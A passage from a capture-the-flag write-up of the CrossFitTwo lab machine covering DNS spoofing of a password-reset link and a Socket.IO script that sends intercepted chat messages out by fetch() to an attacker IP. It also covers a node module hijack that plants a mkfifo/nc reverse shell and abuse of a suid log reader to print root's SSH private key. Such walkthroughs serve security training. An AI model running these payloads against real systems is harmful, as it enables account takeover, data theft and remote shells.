Looking at wireshark we can see the target is indeed sending a dns request to us which obviously fails right now.

[![wireshark_lookup](/img/crossfittwo/wireshark_lookup.png)](/img/crossfittwo/wireshark_lookup.png)

The output from the curl command has also some interesting information, mentioning that the reset has to happen from  localhost. This means we need to spoof the first request to point to `127.0.0.1`.

```
HTTP/1.1 200 OK
...[snip]...
<body>
<div class="alert alert-danger alert-dismissible fade show" role="alert">Only local hosts are allowed.<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>
        <div class="limiter">
...[snip]...
```

Modifying this [python dns server](https://gist.githubusercontent.com/pklaus/b5a7876d4d2cf7271873/raw/cb089513b185f4128d956eef6e0fb9f5fd583e41/ddnsserver.py), to send the first lookup request containing "employee" to `127.0.0.1` and the next one to our vpn ip, we try the same from above again, but this time listening on port 80 to possibly capture david clicking on the password reset.

`dns_spoof.py`
```py
#!/usr/bin/env python
# coding=utf-8

import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

a = 1
class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)

def dns_response(data):
    request = DNSRecord.parse(data)

    print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    if qn != "":
        D = DomainName(qn)
    IP = '10.10.14.65'
    TTL = 600
    global a
    if "employee" in qn and a > 1:
        IP = '10.10.14.65'
        a += 1
    elif "employee" in qn:
        a += 1
        TTL = 10
        IP = '127.0.0.1'


    soa_record = SOA(
        mname=D.ns1,  # primary name server
        rname=D.andrei,  # email of the domain administrator
        times=(
            201307231,  # serial number
            60 * 60 * 1,  # refresh
            60 * 60 * 3,  # retry
            60 * 60 * 24,  # expire
            60 * 60 * 1,  # minimum
        )
    )
    ns_records = [NS(D.ns1), NS(D.ns2)]
    records = {
        D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
        D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
        D.ns2: [A(IP)],
        D.mail: [A(IP)],
        D.andrei: [CNAME(D)],
    }

    if qn == D or qn.endswith('.' + D):

        for name, rrs in records.items():
            if name == qn:
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:
                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))

        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    print("---- Reply:\n", reply)

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
                                               self.client_address[1]))
        try:
            data = self.get_data()
            print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python.')
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python. Usually DNSs use UDP on port 53.')
    parser.add_argument('--port', default=5053, type=int, help='The port to listen on.')
    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')

    args = parser.parse_args()
    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")

    print("Starting nameserver...")

    servers = []
    if args.udp: servers.append(socketserver.ThreadingUDPServer(('', args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer(('', args.port), TCPRequestHandler))

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()
```

For this we first set up a ncat listenser on port 80 and start the dns server on port `53` udp.

```
$ sudo nc -lnvp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
```

```
$ sudo python dns_spoof.py --port 53 --udp
Starting nameserver...
UDP server loop running in thread: Thread-1
```

With all set up we run our bash script again and look at the output.

```
$ sudo ./forward_and_reset.sh
ok
HTTP/1.1 200 OK
```

On the dns server the request arrived and got resolved to `127.0.0.1`. However there was another request in quick succession which got resolved to `10.10.14.65` as we specified it in the server.

```
$sudo python dns_spoof.py --port 53 --udp
Starting nameserver...
UDP server loop running in thread: Thread-1


UDP request 2021-08-12 07:12:28.472997 (10.129.68.20 38406):
57 b'\xacP\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x0fsm1l3zemployees\x08crossfit\x03htb\x00\x00\x01\x00\x01\x00\x00)\x10\x00\x00\x00\x80\x00\x00\x00'
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44112
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; QUESTION SECTION:
;sm1l3zemployees.crossfit.htb.  IN      A
;; ADDITIONAL SECTION:
;; OPT PSEUDOSECTION
; EDNS: version: 0, flags: do; udp: 4096
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44112
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; QUESTION SECTION:
;sm1l3zemployees.crossfit.htb.  IN      A
;; ANSWER SECTION:
sm1l3zemployees.crossfit.htb. 10      IN      A       127.0.0.1
;; AUTHORITY SECTION:
sm1l3zemployees.crossfit.htb. 10      IN      SOA     ns1.sm1l3zemployees.crossfit.htb. andrei.sm1l3zemployees.crossfit.htb. 201307231 3600 10800 86400 3600
;; ADDITIONAL SECTION:
sm1l3zemployees.crossfit.htb. 10      IN      NS      ns1.sm1l3zemployees.crossfit.htb.
sm1l3zemployees.crossfit.htb. 10      IN      NS      ns2.sm1l3zemployees.crossfit.htb.


UDP request 2021-08-12 07:12:28.503203 (10.129.68.20 41908):
57 b'\x04N\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x0fsm1l3zemployees\x08crossfit\x03htb\x00\x00\x01\x00\x01\x00\x00)\x10\x00\x00\x00\x80\x00\x00\x00'
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1102
;; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; QUESTION SECTION:
;sm1l3zemployees.crossfit.htb.  IN      A
;; ADDITIONAL SECTION:
;; OPT PSEUDOSECTION
; EDNS: version: 0, flags: do; udp: 4096
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1102
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; QUESTION SECTION:
;sm1l3zemployees.crossfit.htb.  IN      A
;; ANSWER SECTION:
sm1l3zemployees.crossfit.htb. 600     IN      A       10.10.14.65
;; AUTHORITY SECTION:
sm1l3zemployees.crossfit.htb. 600     IN      SOA     ns1.sm1l3zemployees.crossfit.htb. andrei.sm1l3zemployees.crossfit.htb. 201307231 3600 10800 86400 3600
;; ADDITIONAL SECTION:
sm1l3zemployees.crossfit.htb. 600     IN      NS      ns1.sm1l3zemployees.crossfit.htb.
sm1l3zemployees.crossfit.htb. 600     IN      NS      ns2.sm1l3zemployees.crossfit.htb.
```

[![wireshark_double](/img/crossfittwo/wireshark_double.png)](/img/crossfittwo/wireshark_double.png)

Looking at the output from the curl request it seems like we also have to forward the second request to localhost aswell to bypass the filtering.

```
...[snip]...
<body>
<div class="alert alert-danger alert-dismissible fade show" role="alert">Only local hosts are allowed.<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>
        <div class="limiter">
...[snip]...
```

Modyfing our `dns_spoof.py` script we change it to resolve the first two requests to `127.0.0.1` and the third request to our ip.

`dns_spoof.py`
```py
#!/usr/bin/env python
# coding=utf-8

import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

a = 1
class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)

def dns_response(data):
    request = DNSRecord.parse(data)

    print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    if qn != "":
        D = DomainName(qn)
    IP = '10.10.14.65'
    TTL = 600
    global a
    if "employee" in qn and a > 2:  # HANDLE DOUBLE REQUEST
        IP = '10.10.14.65'
        a += 1
    elif "employee" in qn:
        a += 1
        TTL = 10
        IP = '127.0.0.1'
...[snip]...	
```

Running it again and looking at the curl output there is no error this time and all seems to have went well.

```
$ sudo ./forward_and_reset.sh
ok
HTTP/1.1 200 OK
...[snip]...
<body>
<div class="alert alert-success alert-dismissible fade show" role="alert">Reset link sent, please check your email.<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></butt
on></div>
        <div class="limiter">
...[snip]...
```

After about a minute we see another dns request in wireshark which seems to come from the user clicking on the reset link. This request now get's resolved to our ip.

[![wireshark_triple](/img/crossfittwo/wireshark_triple.png)](/img/crossfittwo/wireshark_triple.png)

Since the host points to our ip, we now capture the password reset on our ncat listener.

```
$ sudo nc -lnvp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.129.68.20.
Ncat: Connection from 10.129.68.20:38921.
GET /password-reset.php?token=58191a336ff6c02903ffede08fa83c5a713132dfaca359a8daf030a256695afa2520a3e46645f6e81c565e4f6ce2db6ed393724b5a54b2e4da05ebe830e6209d HTTP/1.1
Host: sm1l3zemployees.crossfit.htb
User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://crossfit-club.htb/
Upgrade-Insecure-Requests: 1
```

Trying the password reset this time, it tells us that password reset is disabled currently and we have to look for another way in.

[![reset_disabled](/img/crossfittwo/reset_disabled.png)](/img/crossfittwo/reset_disabled.png)

## Socket.IO

Looking closely at the request we see that it is comming from `http://crossfit-club.htb/`. Browsing there we can neither register nor create an account, but it is likely that the request getting sent to us is currently in an authenticated session.

[![crossfit_club_login](/img/crossfittwo/crossfit_club_login.png)](/img/crossfittwo/crossfit_club_login.png)

To find out more about this vhost we take a closer look at the javascript that is being used by the website. One resource stands out by naming convention so we take a closer look at it.

[![crossfit_club_network](/img/crossfittwo/crossfit_club_network.png)](/img/crossfittwo/crossfit_club_network.png)

The source code reveals that it seems to contain another chat functionality.

[![crossfit_club_chatroom](/img/crossfittwo/crossfit_club_chatroom.png)](/img/crossfittwo/crossfit_club_chatroom.png)

Looking up a part of the code `transports polling javascript` from the connect part on google, the chat functionality seems to use the `socket.io` module.

[![lookup_google](/img/crossfittwo/lookup_google.png)](/img/crossfittwo/lookup_google.png)

Checking for this module on the webserver we can retrieve the full source code of it.

[![socket_io_js](/img/crossfittwo/socket_io_js.png)](/img/crossfittwo/socket_io_js.png)

The plan now is to make it seem the admin user joined the chat and listen on the message channels if we get some other user messaging us. We embed this functionality in the `password-reset.php` file, since this is where david get's redirected to. We also base64 encode the response to avoid possible bad characters.

`password-reset.php`
```php
<html><head><script type="text/javascript" src="http://crossfit-club.htb/socket.io/socket.io.js"></script>
<script type="text/javascript">
     var socket = io("http://crossfit-club.htb", { forceNew: false, transports: ["polling"], withCredentials: true });
     socket.on("recv_global", data => {
         fetch('http://10.10.14.65/global?b64=' + btoa(JSON.stringify(data)));
     });
     socket.on("private_recv", data => {
         fetch('http://10.10.14.65/privat?b64=' + btoa(JSON.stringify(data)));
     });
     socket.on("new_user", data => {
         fetch('http://10.10.14.65/newuser?b64=' + btoa(JSON.stringify(data)));
     });
     socket.emit('user_join', {
           username: "admin"
     });
   </script>
   </head>
</html>
```

With all preparations met we set up our dns server again and also a php webserver, serving our custom `password-reset.php`

```
$ sudo python dns_spoof.py --port 53 --udp
```

```
$ sudo php -S 0.0.0.0:80
```

Now we execute our bash script again and wait for a connection.

```
$ sudo ./forward_and_reset.sh
```

After some time we get multiple messages back on our webserver.

```
$ sudo php -S 0.0.0.0:80
[Thu Aug 12 07:50:29 2021] PHP 7.4.21 Development Server (http://0.0.0.0:80) started
[Thu Aug 12 07:50:41 2021] 10.129.68.20:26004 Accepted
[Thu Aug 12 07:50:41 2021] 10.129.68.20:26004 [200]: GET /password-reset.php?token=5af6187f0e8a76bd73019b7b6c7302579314582fc74a591d3d012ee866c5369f2cf8bef6035cbb3fe3c2b785bd6f7c0aebcfe7b1bf06de65c6f3b84fe6a2b896
[Thu Aug 12 07:50:41 2021] 10.129.68.20:26004 Closing
[Thu Aug 12 07:50:42 2021] 10.129.68.20:15767 Accepted
[Thu Aug 12 07:50:42 2021] 10.129.68.20:15767 [404]: GET /favicon.ico - No such file or directory
[Thu Aug 12 07:50:42 2021] 10.129.68.20:15767 Closing
[Thu Aug 12 07:50:42 2021] 10.129.68.20:36370 Accepted
[Thu Aug 12 07:50:42 2021] 10.129.68.20:36370 [404]: GET /newuser?b64=eyJfaWQiOjEsInVzZXJuYW1lIjoiQWRtaW4iLCJzdGF0dXMiOnsic3RhdGUiOiJvbmxpbmUifX0= - No such file or directory
[Thu Aug 12 07:50:42 2021] 10.129.68.20:36370 Closing
[Thu Aug 12 07:50:45 2021] 10.129.68.20:33050 Accepted
[Thu Aug 12 07:50:45 2021] 10.129.68.20:33050 [404]: GET /privat?b64=eyJzZW5kZXJfaWQiOjE1LCJjb250ZW50IjoiSSBoYXZlIG5ldmVyIGhlYXJkIG9mIEZhbmZlc3QsIiwicm9vbUlkIjoxNSwiX2lkIjoyNTAxfQ== - No such file or directory
[Thu Aug 12 07:50:45 2021] 10.129.68.20:33050 Closing
[Thu Aug 12 07:50:45 2021] 10.129.68.20:21063 Accepted
[Thu Aug 12 07:50:45 2021] 10.129.68.20:21063 [404]: GET /global?b64=eyJzZW5kZXJfaWQiOjEzLCJjb250ZW50IjoiSSdtIG5vdCAgYSBodWdlIGZhbiBvZiBHb29nbGUsIGJ1dCBJIHVzZSBpdCBhIGxvdCBiZWNhdXNlIEkgaGF2ZSB0by4gSSB0aGluayB0aGV5IGFyZSBhIG1vbm9wb2x5IGluIHNvbWUgc2Vuc2UuIiwicm9vbUlkIjoiZ2xvYmFsIiwiX2lkIjoyNTAyLCJ1c2VybmFtZSI6IlBlcGUifQ== - No such file or directory
[Thu Aug 12 07:50:45 2021] 10.129.68.20:21063 Closing
[Thu Aug 12 07:51:04 2021] 10.129.68.20:31586 Accepted
[Thu Aug 12 07:51:04 2021] 10.129.68.20:31586 [404]: GET /privat?b64=eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6MjUwM30= - No such file or directory
[Thu Aug 12 07:51:04 2021] 10.129.68.20:31586 Closing
[Thu Aug 12 07:51:36 2021] 10.129.68.20:20377 Accepted
[Thu Aug 12 07:51:36 2021] 10.129.68.20:20377 [404]: GET /global?b64=eyJzZW5kZXJfaWQiOjExLCJjb250ZW50IjoiQXd3d3cgeWlwIHlpcCIsInJvb21JZCI6Imdsb2JhbCIsIl9pZCI6MjUwNCwidXNlcm5hbWUiOiJMdWNpbGxlIn0= - No such file or directory
[Thu Aug 12 07:51:36 2021] 10.129.68.20:20377 Closing
[Thu Aug 12 07:51:36 2021] 10.129.68.20:20705 Accepted
[Thu Aug 12 07:51:36 2021] 10.129.68.20:20705 [404]: GET /privat?b64=eyJzZW5kZXJfaWQiOjEzLCJjb250ZW50IjoiSSBsb3ZlIHRvIGRhbmNlIGEgbG90LiBIb3cgYWJvdXQgeW91PyIsInJvb21JZCI6MTMsIl9pZCI6MjUwNX0= - No such file or directory
[Thu Aug 12 07:51:36 2021] 10.129.68.20:20705 Closing
[Thu Aug 12 07:52:16 2021] 10.129.68.20:44371 Accepted
[Thu Aug 12 07:52:16 2021] 10.129.68.20:44371 [404]: GET /privat?b64=eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6MjUwNn0= - No such file or directory
[Thu Aug 12 07:52:16 2021] 10.129.68.20:44371 Closing
[Thu Aug 12 07:52:27 2021] 10.129.68.20:19695 Accepted
[Thu Aug 12 07:52:27 2021] 10.129.68.20:19695 [404]: GET /privat?b64=eyJzZW5kZXJfaWQiOjE1LCJjb250ZW50IjoiRG8geW91IGtub3cgaG93IGdvb2dsZSBtYXBzIGNhbGN1bGF0ZXMgdHJhZmZpYz8iLCJyb29tSWQiOjE1LCJfaWQiOjI1MDd9 - No such file or directory
[Thu Aug 12 07:52:27 2021] 10.129.68.20:19695 Closing
[Thu Aug 12 07:52:27 2021] 10.129.68.20:17334 Accepted
[Thu Aug 12 07:52:27 2021] 10.129.68.20:17334 [404]: GET /global?b64=eyJzZW5kZXJfaWQiOjEyLCJjb250ZW50IjoiR29vZCBNb3JuaW5nISBIb3cgYXJlIHlvdSB0b2RheT8iLCJyb29tSWQiOiJnbG9iYWwiLCJfaWQiOjI1MDgsInVzZXJuYW1lIjoiQm9yaXMifQ== - No such file or directory
[Thu Aug 12 07:52:27 2021] 10.129.68.20:17334 Closing
```

Decoding them, one contains the password for the user david in a private message.

```
$ echo -n eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6MjUwM30= | base64 -d
{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.","roomId":2,"_id":2503}
```

We are now able to log in as david over ssh and grab the user flag.

```
$ ssh david@crossfit.htb
Warning: Permanently added the ECDSA host key for IP address '10.129.68.20' to the list of known hosts.
david@crossfit.htb's password: 
OpenBSD 6.8 (GENERIC.MP) #4: Mon Jan 11 10:35:56 MST 2021

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

Besides the device, the box should contain:

* Eight little rectangular snippets of paper that say "WARNING"

* A plastic packet containing four 5/17 inch pilfer grommets and two
  club-ended 6/93 inch boxcar prawns.

YOU WILL NEED TO SUPPLY: a matrix wrench and 60,000 feet of tram
cable.

IF ANYTHING IS DAMAGED OR MISSING: You IMMEDIATELY should turn to your
spouse and say: "Margaret, you know why this country can't make a car
that can get all the way through the drive-through at Burger King
without a major transmission overhaul?  Because nobody cares, that's
why."

WARNING: This is assuming your spouse's name is Margaret.
                -- Dave Barry, "Read This First!"
crossfit2:david {1} wc -c user.txt
      33 user.txt
```

# Root

## Hijack node module

Looking at the groups we see that david is in the `sysadmins` group.

```
crossfit2:david {2} id
uid=1004(david) gid=1004(david) groups=1004(david), 1003(sysadmins)
```

For a more familiar shell we switch to `sh`.

```
crossfit2:david {12} /bin/sh
```

Then we look for all the files owned by the `sysadmins` group on the system. This only returns a folder in opt.

```
crossfit2$ find / -group sysadmins 2>/dev/null 
/opt/sysadmin
```

Going deeper down the directory structure we find a javascript file `statbot.js`

```
crossfit2$ cat /opt/sysadmin/server/statbot/statbot.js
const WebSocket = require('ws');
const fs = require('fs');
const logger = require('log-to-file');
const ws = new WebSocket("ws://gym.crossfit.htb/ws/");
function log(status, connect) {
  var message;
  if(status) {
    message = `Bot is alive`;
  }
  else {
    if(connect) {
      message = `Bot is down (failed to connect)`;
    }
    else {
      message = `Bot is down (failed to receive)`;
    }
  }
  logger(message, '/tmp/chatbot.log');
}
ws.on('error', function err() {
  ws.close();
  log(false, true);
})
ws.on('message', function message(data) {
  data = JSON.parse(data);
  try {
    if(data.status === "200") {
      ws.close()
      log(true, false);
    }
  }
  catch(err) {
      ws.close()
      log(false, false);
  }
});
```

Looking at the log file it generates, it seems to be executed every minute.

```
crossfit2$ cat /tmp/chatbot.log
2021.08.11, 16:27:12.0414 UTC -> Bot is alive
2021.08.11, 16:28:02.0464 UTC -> Bot is alive
2021.08.11, 16:29:02.0680 UTC -> Bot is alive
2021.08.11, 16:30:02.0860 UTC -> Bot is down (failed to connect)
2021.08.11, 16:31:01.0937 UTC -> Bot is alive
2021.08.11, 16:32:03.0255 UTC -> Bot is alive
...[snip]...
2021.08.12, 07:57:03.0228 UTC -> Bot is alive
2021.08.12, 07:58:03.0054 UTC -> Bot is alive
2021.08.12, 07:59:03.0251 UTC -> Bot is alive
2021.08.12, 08:00:02.0804 UTC -> Bot is alive
2021.08.12, 08:01:01.0849 UTC -> Bot is alive
2021.08.12, 08:02:04.0961 UTC -> Bot is alive
```

The script imports 3 modules which is interesting because we can write in the path above it. The way node searches for modules is the following. First it looks if the module is a core module. If it is not it looks in the current directory and THEN traverses back up the directory structure to look for a `node_modules` directory. Since we have the right to write in the `/opt/sysadmin/` directory we can hijack a module that is being importet to execute a reverse shell.

We first set up our ncat listener again.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Then we create a `/opt/sysadmin/node_modules` directory and a `/opt/sysadmin/node_modules/ws.js` file which contains our reverse shell. The next time the `statbot.js` is now executed our reverse shell get's imported and executed.

```
crossfit2$ mkdir /opt/sysadmin/node_modules
crossfit2$ vi /opt/sysadmin/node_modules/ws.js
```

`ws.js`
```js
module.exports = class WebSocket{
   constructor(stuff){
     this.stuff = stuff;
   }
   on(doesnt, matter){
     require('child_process').exec('rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.65 7575 >/tmp/g');
 }
}
```

After about a minute we get a shell on our listener as john which we upgrade using python.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.68.20.
Ncat: Connection from 10.129.68.20:23188.
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
crossfit2$ python3 -c 'import pty;pty.spawn("/bin/sh")'
crossfit2$ export TERM=xterm
export TERM=xterm
crossfit2$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

crossfit2$ id
uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)
```

## LogReader

john is in the staff group and looking for files belonging to this group we find the  `/usr/local/bin/log` binary.

```
crossfit2$ find / -group staff 2>/dev/null
/usr/local/bin/log
```

Taking a closer look at it we see it has the suid bit set which makes it very interesting.

```
crossfit2$ ls -la /usr/local/bin/log
-rwsr-s---  1 root  staff  9024 Jan  5  2021 /usr/local/bin/log
```

For further examination we transfer the file over to our local machine using ncat and check the file hashes once the transfer is completed to ensure nothing got corrupted.

```
$ nc -lnvp 43212 > log
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::43212
```

```
crossfit2$ nc 10.10.14.65 43212 < /usr/local/bin/log
```

```
$ nc -lnvp 43212 > log
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::43212
Ncat: Listening on 0.0.0.0:43212
Ncat: Connection from 10.129.68.20.
Ncat: Connection from 10.129.68.20:43781.
^C
```

```
$ md5sum log 
3e78431e1a55eecd6586af17e9b3b427  log
```

```
crossfit2$ md5 /usr/local/bin/log
MD5 (/usr/local/bin/log) = 3e78431e1a55eecd6586af17e9b3b427
```

Opening it up in ghidra and looking at the main function we see a comparison being done right at the beginning. Changing the data type of the left value to string we see it is comparing to `/var` and exits if the check fails. 

[![ghidra_restrict](/img/crossfittwo/ghidra_restrict.png)](/img/crossfittwo/ghidra_restrict.png)

Testing it on a log file in `/var` we see it indeed retrives the file.

```
crossfit2$ log /var/log/security.out

* LogReader v0.1

[*] Log size: 1111


Running security(8):

Checking the /etc/master.passwd file:
Login node is off but still has a valid shell and alternate access files in
         home directory are still readable.

Setuid deletions:
-rwsr-xr-x 1 root wheel 6896 Jan 1 05:39:57 2021 /usr/bin/log

Checking special files and directories.
Output format is:
        filename:
                criteria (shouldbe, reallyis)
etc/crontab: 
        permissions (0600, 0644)
etc/relayd.conf: 
        permissions (0600, 0644)
missing: ./var/cron/log
missing: ./var/log/authlog
missing: ./var/log/secure
missing: ./var/log/wtmp
missing: ./var/log/lastlog
mtree special: exit code 2

======
/etc/dhclient.conf diffs (-OLD  +NEW)
======
--- /dev/null   Thu Aug 12 01:31:07 2021
+++ /etc/dhclient.conf  Thu Mar 18 13:25:53 2021
@@ -0,0 +1 @@
+ignore domain-name, domain-name-servers, domain-search;


======
/etc/hostname.vmx0 SHA-256 checksums
======
OLD: 6e053caf1ef5e18c7ec678166fa73c3d17fd3c717193b36b80e4f374fe81a8ab
NEW: d32df3bccac7b83e88dc1c90c343109e302bc832d1eef842282084fa7ffb63ee
sendmail: cannot create temporary file /var/spool/smtpd/offline/1628728269.GYlmnaPY3G: Operation not permitted
```

But using it on a file outside of `/var` it fails.

```
crossfit2$ log /etc/passwd

* LogReader v0.1

[-] Log file not found!
```

Looking for interesting files in the `backup` directory under `/var` we can retrieve the backed up root ssh key using the naming convention of replacing `/` with `_` and adding a `.current`.

```
crossfit2$ ltrace log /var/backups/root_.ssh_id_rsa.current 

* LogReader v0.1

[*] Log size: 2610

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA8kTcUuEP05YI+m24YdS3WLOuYAhGt9SywnPrBTcmT3t0iZFccrHc
2KmIttQRLyKOdaYiemBQmno92butoK2wkL3CAHUuPEyHVAaNsGe3UdxBCFSRZNHNLyYCMh
3AWj3gYLuLniZ2l6bZOSbnifkEHjCcgy9JSGutiX+umfD11wWQyDJy2QtCHywQrKM8m1/0
5+4xCqtCgveN/FrcdrTzodAHTNoCNTgzzkKrKhcah/nLBWp1cv30z6kPKBKx/sZ5tHX0u1
69Op6JqWelCu+qZViBy/99BDVoaRFBkolcgavhAIkV9MnUrMXRsHAucpo+nA5K4j7vwWLG
TzLOzrBGA3ZDP7w2GD7KtH070CctcjXfx7fcmhPmQDBEg4chXRBDPWzGyvKr7TIEMNVtjI
Ug4kYNJEfSef2aWslSfi7syVUHkfvUjYnW6f2hHprHUvMtVBHPvWQxcRnxvyHuzaXetSNH
ROva0OpGPaqpk9IOseue7Qa1+/PKxD4j87eCdzIpAAAFkDo2gjg6NoI4AAAAB3NzaC1yc2
EAAAGBAPJE3FLhD9OWCPptuGHUt1izrmAIRrfUssJz6wU3Jk97dImRXHKx3NipiLbUES8i
jnWmInpgUJp6Pdm7raCtsJC9wgB1LjxMh1QGjbBnt1HcQQhUkWTRzS8mAjIdwFo94GC7i5
4mdpem2Tkm54n5BB4wnIMvSUhrrYl/rpnw9dcFkMgyctkLQh8sEKyjPJtf9OfuMQqrQoL3
jfxa3Ha086HQB0zaAjU4M85CqyoXGof5ywVqdXL99M+pDygSsf7GebR19LtevTqeialnpQ
rvqmVYgcv/fQQ1aGkRQZKJXIGr4QCJFfTJ1KzF0bBwLnKaPpwOSuI+78Fixk8yzs6wRgN2
Qz+8Nhg+yrR9O9AnLXI138e33JoT5kAwRIOHIV0QQz1sxsryq+0yBDDVbYyFIOJGDSRH0n
